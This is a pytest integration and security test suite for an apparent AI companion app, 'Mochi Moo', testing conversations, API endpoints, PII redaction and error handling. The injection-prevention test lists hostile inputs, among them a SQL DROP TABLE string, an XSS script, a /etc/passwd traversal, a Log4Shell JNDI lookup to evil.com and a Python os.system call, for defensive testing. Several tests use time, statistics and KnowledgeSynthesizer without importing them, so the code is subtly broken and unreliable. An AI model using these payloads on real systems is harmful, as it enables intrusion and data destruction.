"""
Integration and Security Testing Suite
Author: Cazandra Aporbo MS
Validates end-to-end functionality and security controls
"""

import pytest
import asyncio
import json
import tempfile
import shutil
from pathlib import Path
from unittest.mock import Mock, patch, AsyncMock
import re
import hashlib
import secrets
from typing import Dict, Any, List
import httpx
from fastapi.testclient import TestClient

from mochi_moo.core import MochiCore, EmotionalContext, CognitiveMode
from mochi_moo.server import app, MochiSession, get_or_create_session


class TestEndToEndIntegration:
    """Complete end-to-end integration testing"""
    
    @pytest.mark.asyncio
    async def test_full_conversation_flow(self):
        """Test complete conversation from initialization to complex synthesis"""
        mochi = MochiCore()
        
        conversation = [
            ("Hello, Mochi!", "standard"),
            ("I'm feeling overwhelmed with learning quantum physics", "emotional"),
            ("Can you explain superposition in simple terms?", "educational"),
            ("How does this relate to consciousness?", "synthesis"),
            ("Thank you, that was helpful", "closure")
        ]
        
        emotional_journey = []
        responses = []
        
        for message, expected_type in conversation:
            response = await mochi.process(message, emotional_context=True)
            responses.append(response)
            emotional_journey.append(mochi.get_emotional_state())
            
            # Verify response quality
            assert response['content'], f"Empty response for {expected_type}"
            assert len(response['content']) > 50, f"Response too short for {expected_type}"
            assert response['micro_dose'], "Missing micro-dose insight"
            
        # Verify emotional journey makes sense
        # Should show increased engagement after help
        assert emotional_journey[-1]['engagement'] > emotional_journey[0]['engagement']
        
        # Stress should decrease after support
        assert emotional_journey[-1]['stress_level'] <= emotional_journey[1]['stress_level']
        
    @pytest.mark.asyncio
    async def test_mode_transitions(self):
        """Test smooth transitions between cognitive modes"""
        mochi = MochiCore()
        
        mode_sequence = [
            (CognitiveMode.STANDARD, "Explain machine learning"),
            (CognitiveMode.ACADEMIC, "Explain machine learning"),
            (CognitiveMode.WHISPER, "Explain machine learning"),
            (CognitiveMode.CREATIVE, "Explain machine learning"),
            (CognitiveMode.LULLABY, "Explain machine learning"),
        ]
        
        responses = {}
        for mode, prompt in mode_sequence:
            mochi.set_mode(mode.value)
            response = await mochi.process(prompt)
            responses[mode.value] = response
            
            # Verify mode-specific characteristics
            if mode == CognitiveMode.WHISPER:
                # Should have line breaks for breath
                assert '\n\n' in response['content']
            elif mode == CognitiveMode.ACADEMIC:
                # Should have technical depth
                assert any(term in response['content'].lower() 
                          for term in ['algorithm', 'function', 'optimization', 'gradient'])
            elif mode == CognitiveMode.LULLABY:
                # Should be soothing
                assert '...' in response['content']
                
        # All responses should be different
        contents = [r['content'] for r in responses.values()]
        assert len(set(contents)) == len(contents), "Modes producing identical responses"
        
    @pytest.mark.asyncio
    async def test_synthesis_integration(self):
        """Test complete synthesis workflow with caching"""
        mochi = MochiCore()
        
        # First synthesis - cold cache
        domains1 = ['neuroscience', 'philosophy', 'quantum_physics']
        query1 = "What is consciousness?"
        
        response1 = await mochi.process(
            query1,
            domains=domains1,
            emotional_context=True
        )
        
        assert 'synthesis' in response1 or 'content' in response1
        
        # Second synthesis - should use cache
        response2 = await mochi.process(
            query1,
            domains=domains1,
            emotional_context=False
        )
        
        # Third synthesis - different domains
        domains3 = ['mathematics', 'art', 'music']
        query3 = "What patterns connect these fields?"
        
        response3 = await mochi.process(
            query3,
            domains=domains3,
            visualization="concept_map"
        )
        
        assert 'visualizations' in response3
        assert len(response3['visualizations']) > 0
        
    @pytest.mark.asyncio
    async def test_session_persistence(self):
        """Test session state persistence across interactions"""
        mochi = MochiCore()
        
        # Build up context
        messages = [
            "My name is Alice",
            "I'm working on a machine learning project",
            "It's about natural language processing",
            "I'm stuck on the tokenization part"
        ]
        
        for msg in messages:
            await mochi.process(msg)
            
        # Verify context is maintained
        assert len(mochi.interaction_history) > 0
        
        # Check emotional evolution
        final_state = mochi.get_emotional_state()
        assert final_state['curiosity'] > 0.5  # Should be engaged with technical topic
        
        # Verify trace files are created
        trace_files = list(Path('.mochi_trace').glob('*.json'))
        assert len(trace_files) >= len(messages)
        
        # Clean up
        shutil.rmtree('.mochi_trace', ignore_errors=True)
        

class TestAPIIntegration:
    """Test FastAPI server integration"""
    
    @pytest.fixture
    def client(self):
        """Create test client"""
        return TestClient(app)
        
    def test_api_health_check(self, client):
        """Test health endpoint"""
        response = client.get("/health")
        assert response.status_code == 200
        data = response.json()
        assert data['status'] == 'healthy'
        assert 'timestamp' in data
        
    def test_api_process_endpoint(self, client):
        """Test main processing endpoint"""
        request_data = {
            "input": "Test query for API",
            "emotional_context": True,
            "visualization": None,
            "domains": ["test", "api"]
        }
        
        response = client.post("/process", json=request_data)
        assert response.status_code == 200
        
        data = response.json()
        assert 'content' in data
        assert 'metadata' in data
        assert 'session_id' in data
        
    def test_api_synthesis_endpoint(self, client):
        """Test synthesis endpoint"""
        request_data = {
            "domains": ["math", "physics", "chemistry"],
            "query": "How do patterns emerge?"
        }
        
        response = client.post("/synthesize", json=request_data)
        assert response.status_code == 200
        
        data = response.json()
        assert 'synthesis' in data
        assert 'session_id' in data
        
    def test_api_mode_switching(self, client):
        """Test mode switching endpoint"""
        request_data = {
            "mode": "whisper",
            "session_id": "test-session"
        }
        
        response = client.post("/mode", json=request_data)
        assert response.status_code == 200
        
        data = response.json()
        assert data['status'] == 'success'
        assert data['mode'] == 'whisper'
        
    def test_api_session_management(self, client):
        """Test session creation and retrieval"""
        # Create session
        response1 = client.post("/process", json={"input": "Hello"})
        session_id = response1.json()['session_id']
        
        # Use same session
        response2 = client.post("/process", json={
            "input": "Remember me?",
            "session_id": session_id
        })
        
        assert response2.json()['session_id'] == session_id
        
        # Get session list
        response3 = client.get("/sessions")
        assert response3.status_code == 200
        sessions = response3.json()['sessions']
        assert any(s['session_id'] == session_id for s in sessions)
        
    def test_api_error_handling(self, client):
        """Test API error handling"""
        # Invalid mode
        response = client.post("/mode", json={"mode": "invalid_mode"})
        assert response.status_code == 400
        
        # Missing required field
        response = client.post("/process", json={})
        assert response.status_code == 422
        
        # Non-existent session
        response = client.get("/emotional-state/non-existent-session")
        assert response.status_code == 404
        

class TestSecurityControls:
    """Security validation testing"""
    
    def test_pii_redaction_comprehensive(self):
        """Test comprehensive PII redaction"""
        mochi = MochiCore()
        
        test_cases = [
            # SSN variants
            ("123-45-6789", "[SSN_REDACTED]"),
            ("123 45 6789", "[SSN_REDACTED]"),
            # Email variants
            ("john@example.com", "[EMAIL_REDACTED]"),
            ("john.doe+tag@example.co.uk", "[EMAIL_REDACTED]"),
            # Phone variants
            ("555-123-4567", "[PHONE_REDACTED]"),
            ("(555) 123-4567", "[PHONE_REDACTED]"),
            ("555.123.4567", "[PHONE_REDACTED]"),
            # Credit cards
            ("4532123456789012", "[CARD_REDACTED]"),
            ("5432-1234-5678-9012", "[CARD_REDACTED]"),
        ]
        
        for original, expected_pattern in test_cases:
            filtered = mochi.privacy_filter(f"My info is {original}")
            assert expected_pattern in filtered, f"Failed to redact {original}"
            assert original not in filtered, f"Original {original} not removed"
            
    def test_no_credential_storage(self):
        """Verify no credentials are stored in traces"""
        mochi = MochiCore()
        
        # Process sensitive data
        sensitive_input = "My password is SuperSecret123! and API key is sk-1234567890abcdef"
        response = asyncio.run(mochi.process(sensitive_input))
        
        # Check traces don't contain sensitive data
        trace_files = list(Path('.mochi_trace').glob('*.json'))
        for trace_file in trace_files:
            with open(trace_file) as f:
                trace_data = json.load(f)
                trace_str = json.dumps(trace_data)
                assert "SuperSecret123" not in trace_str
                assert "sk-1234567890" not in trace_str
                
        # Clean up
        shutil.rmtree('.mochi_trace', ignore_errors=True)
        
    def test_injection_prevention(self):
        """Test prevention of injection attacks"""
        mochi = MochiCore()
        
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "__import__('os').system('ls')"  # Python injection
        ]
        
        for attempt in injection_attempts:
            response = asyncio.run(mochi.process(attempt))
            # Should process safely without executing
            assert response is not None
            assert 'error' not in response
            
    def test_rate_limiting_simulation(self):
        """Simulate rate limiting behavior"""
        mochi = MochiCore()
        request_times = []
        
        # Simulate rapid requests
        for i in range(100):
            start = time.perf_counter()
            asyncio.run(mochi.process(f"Request {i}"))
            request_times.append(time.perf_counter() - start)
            
        # Later requests should not be significantly slower (no blocking)
        avg_first_10 = statistics.mean(request_times[:10])
        avg_last_10 = statistics.mean(request_times[-10:])
        
        # Should handle burst without degradation
        assert avg_last_10 < avg_first_10 * 2, "Performance degradation under rapid requests"
        
    def test_input_validation(self):
        """Test input validation and sanitization"""
        mochi = MochiCore()
        
        # Test various input edge cases
        test_inputs = [
            "",  # Empty
            " " * 10000,  # Large whitespace
            "a" * 100000,  # Very long input
            "\x00\x01\x02",  # Binary characters
            "😀" * 1000,  # Unicode flood
            "\n" * 1000,  # Newline flood
        ]
        
        for test_input in test_inputs:
            try:
                response = asyncio.run(mochi.process(test_input))
                assert response is not None
                # Should handle gracefully without crashes
            except Exception as e:
                pytest.fail(f"Failed to handle input safely: {e}")
                
    def test_secure_random_generation(self):
        """Test secure random number generation"""
        # Verify using cryptographically secure random
        tokens = set()
        for _ in range(1000):
            token = secrets.token_hex(16)
            tokens.add(token)
            
        # All should be unique
        assert len(tokens) == 1000, "Random generation not sufficiently random"
        
        # Check entropy
        for token in list(tokens)[:10]:
            entropy = len(set(token))
            assert entropy > 10, f"Low entropy in token: {token}"
            
    def test_hash_consistency(self):
        """Test hash generation consistency and security"""
        synthesizer = KnowledgeSynthesizer()
        
        # Same input should produce same hash
        domains = ['domain1', 'domain2']
        query = "test query"
        
        key1 = hashlib.md5(f"{sorted(domains)}{query}".encode()).hexdigest()
        key2 = hashlib.md5(f"{sorted(domains)}{query}".encode()).hexdigest()
        
        assert key1 == key2, "Hash not consistent"
        assert len(key1) == 32, "MD5 hash should be 32 characters"
        
        # Different input should produce different hash
        key3 = hashlib.md5(f"{sorted(['other'])}{query}".encode()).hexdigest()
        assert key1 != key3, "Different inputs producing same hash"
        

class TestDataIntegrity:
    """Test data integrity and consistency"""
    
    @pytest.mark.asyncio
    async def test_trace_integrity(self):
        """Test trace file integrity and format"""
        mochi = MochiCore()
        
        # Generate traces
        for i in range(5):
            await mochi.process(f"Test message {i}")
            
        # Verify all traces are valid JSON
        trace_files = list(Path('.mochi_trace').glob('*.json'))
        assert len(trace_files) >= 5
        
        for trace_file in trace_files:
            with open(trace_file) as f:
                try:
                    trace_data = json.load(f)
                    # Verify required fields
                    assert 'timestamp' in trace_data
                    assert 'interaction_id' in trace_data
                    assert 'context' in trace_data
                    assert 'emotional_state' in trace_data
                    assert 'predictions' in trace_data
                except json.JSONDecodeError:
                    pytest.fail(f"Invalid JSON in trace file: {trace_file}")
                    
        # Clean up
        shutil.rmtree('.mochi_trace', ignore_errors=True)
        
    @pytest.mark.asyncio
    async def test_emotional_state_boundaries(self):
        """Test emotional state values stay within valid bounds"""
        mochi = MochiCore()
        
        # Try to push emotional states to extremes
        extreme_inputs = [
            "I'M SO STRESSED! EVERYTHING IS TERRIBLE!" * 10,
            "This is amazing! Best thing ever! So excited!" * 10,
            "I'm confused, lost, don't understand anything" * 10,
        ]
        
        for input_text in extreme_inputs:
            await mochi.process(input_text)
            state = mochi.get_emotional_state()
            
            # All values should remain in [0, 1]
            for key, value in state.items():
                assert 0 <= value <= 1, f"{key} = {value} out of bounds"
                
    def test_cache_integrity(self):
        """Test cache integrity under concurrent access"""
        synthesizer = KnowledgeSynthesizer()
        
        import threading
        
        def access_cache(thread_id):
            for i in range(100):
                domains = [f"domain_{thread_id}", f"domain_{i}"]
                synthesizer.integrate(domains, f"query_{thread_id}_{i}")
                
        threads = []
        for i in range(10):
            t = threading.Thread(target=access_cache, args=(i,))
            threads.append(t)
            t.start()
            
        for t in threads:
            t.join()
            
        # Cache should still be valid
        cache_size = len(synthesizer.synthesis_cache)
        assert cache_size > 0, "Cache is empty after concurrent access"
        
        # Verify cache entries are valid
        for key, value in synthesizer.synthesis_cache.items():
            assert isinstance(value, dict), f"Invalid cache entry: {value}"
            assert 'coherence_score' in value
            
    @pytest.mark.asyncio
    async def test_mode_consistency(self):
        """Test mode remains consistent across operations"""
        mochi = MochiCore()
        
        # Set mode
        mochi.set_mode('whisper')
        assert mochi.current_mode == CognitiveMode.WHISPER
        
        # Process multiple requests
        for i in range(10):
            await mochi.process(f"Test {i}")
            
            # Mode should not change unless explicitly set
            assert mochi.current_mode == CognitiveMode.WHISPER
            
        # Test auto-switching based on stress
        mochi.set_mode('standard')
        mochi.emotional_context.stress_level = 0.9
        await mochi.process("High stress test")
        
        # Should auto-switch to whisper
        assert mochi.current_mode == CognitiveMode.WHISPER


class TestErrorRecovery:
    """Test error handling and recovery"""
    
    @pytest.mark.asyncio
    async def test_graceful_degradation(self):
        """Test system degradation under errors"""
        mochi = MochiCore()
        
        # Simulate various error conditions
        with patch('mochi_moo.core.KnowledgeSynthesizer.integrate', side_effect=Exception("Synthesis error")):
            response = await mochi.process("Test", domains=['test'])
            # Should still return response without synthesis
            assert response is not None
            assert 'content' in response
            
    @pytest.mark.asyncio
    async def test_recovery_from_corruption(self):
        """Test recovery from corrupted data"""
        mochi = MochiCore()
        
        # Corrupt the interaction history
        mochi.interaction_history.append(None)
        mochi.interaction_history.append({'invalid': 'structure'})
        
        # Should still process normally
        response = await mochi.process("Recovery test")
        assert response is not None
        
    def test_cache_recovery(self):
        """Test cache recovery from corruption"""
        synthesizer = KnowledgeSynthesizer()
        
        # Corrupt cache
        synthesizer.synthesis_cache['bad_key'] = "invalid_value"
        synthesizer.synthesis_cache['another_bad'] = None
        
        # Should handle gracefully
        try:
            result = synthesizer.integrate(['domain1', 'domain2'], 'test')
            assert result is not None
            assert 'coherence_score' in result
        except Exception as e:
            pytest.fail(f"Failed to recover from cache corruption: {e}")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
